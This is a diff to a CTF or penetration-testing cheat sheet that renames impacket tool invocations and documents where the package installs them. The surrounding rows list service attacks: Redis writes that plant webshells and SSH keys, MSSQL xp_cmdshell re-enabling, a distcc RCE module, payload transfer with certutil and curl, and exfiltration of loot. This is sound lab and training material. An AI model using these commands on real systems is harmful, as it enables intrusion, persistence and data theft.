@@ -20,13 +20,13 @@ Your VPN IP: `ip a show <vpn-iface>` — record it in notes.md.
 | Web 80/443/8080 | source audit, known CMS/plugin CVEs, upload, RCE | skill `ctf-web` |
 | Old daemon any port | `searchsploit <svc> <version>` | see below |
 | FTP 21 | anonymous + writable dir → upload reverse trigger (webroot symlink, planned exec) | `put` then trigger via web/cron if reachable |
-| SMB 445 | share browse; writable share + scheduled task/autorun file; `impacket-smbexec` with creds | enumerate with `smbclient -L -N`, `enum4linux-ng` |
+| SMB 445 | share browse; writable share + scheduled task/autorun file; `smbexec.py` with creds | enumerate with `smbclient -L -N`, `enum4linux-ng` |
 | NFS 2049 | `showmount -e <target>`; mount, abuse `no_root_squash` | trick below |
 | distcc 3632 | `distccd` RCE (CVE-2004-2687): `msfconsole > use exploit/unix/misc/distcc_exec` | any unauth compile/exec service: same shape |
 | MySQL 3306 | creds → `SELECT ... INTO OUTFILE` webshell if DB root + known webroot; UDF lib RCE | foothold.md UDF rare, try file write first |
 | MongoDB 27017 | unauth → dump users collection for password reuse | `mongosh`, `db.getCollectionNames()` |
 | Redis 6379 | unauth write: webshell via `CONFIG SET dir <webroot>` + `SET`/`SAVE`; or SSH key: `CONFIG SET dir ~/.ssh` + `SET x "\n\nssh-rsa ...\n\n"` + `CONFIG SET dbfilename authorized_keys` + `SAVE` | classic redis-as-file-writer |
-| MSSQL 1433 | creds → `EXEC xp_cmdshell 'whoami'`; re-enable: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` | `impacket-mssqlclient` |
+| MSSQL 1433 | creds → `EXEC xp_cmdshell 'whoami'`; re-enable: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` | `mssqlclient.py` |
 | SSH 22 | key reuse (found keys), user enumeration (timing on valid vs invalid user with password attempts) | not usually the way in |
 | RDP 3389 | only with found creds; `xfreerdp /u: /p: /v:` | check `cmdkey /list` loot |
 | WinRM 5985/5986 | found creds → `evil-winrm -i <target> -u <user> -p <pw>` (pacman `evil-winrm`) | best Windows shell when creds exist |
@@ -97,12 +97,14 @@ Base64-wrap long PowerShell when quotes get mangled:
 |---|---|
 | Host → target (any shell) | `python3 -m http.server 8000` in the dir, then on target `curl -O http://VPNIP:8000/<f>` or `wget http://VPNIP:8000/<f>` |
 | Host → Windows target | `certutil -urlcache -f http://VPNIP:8000/p.exe p.exe` |
-| Host → target via SMB | `uv pip install --python .venv/bin/python impacket` then `.venv/bin/impacket-smbserver share .` on host; target: `copy \\\\VPNIP\\share\\p.exe` (Windows) or `mount -t cifs //VPNIP/share /mnt` |
-| Target → host (exfil loot) | `scp file user@VPNIP:/path/` (needs our sshd), or python http.server on target + `curl -O` on host, or `impacket-smbserver` + push |
+| Host → target via SMB | `uv pip install --python .venv/bin/python impacket` then `scripts/ctf smbserver.py share .` on host; target: `copy \\\\VPNIP\\share\\p.exe` (Windows) or `mount -t cifs //VPNIP/share /mnt` |
+| Target → host (exfil loot) | `scp file user@VPNIP:/path/` (needs our sshd), or python http.server on target + `curl -O` on host, or `smbserver.py` + push |
 
-The impacket pip package installs its example tools as console scripts — after
-install they live at `.venv/bin/impacket-smbserver`, `.venv/bin/impacket-psexec`,
-`.venv/bin/impacket-secretsdump`, etc. (run via `scripts/ctf` or the full path).
+The impacket pip package installs its example tools under their upstream names
+(setup.py ships `examples/*.py` verbatim): after install they live at
+`.venv/bin/secretsdump.py`, `.venv/bin/psexec.py`, `.venv/bin/smbserver.py`,
+etc. — run via `scripts/ctf <name>.py` or the full path. Arch's `impacket`
+package installs the same names into `/usr/bin`.
 
 ## Immediately after foothold
 
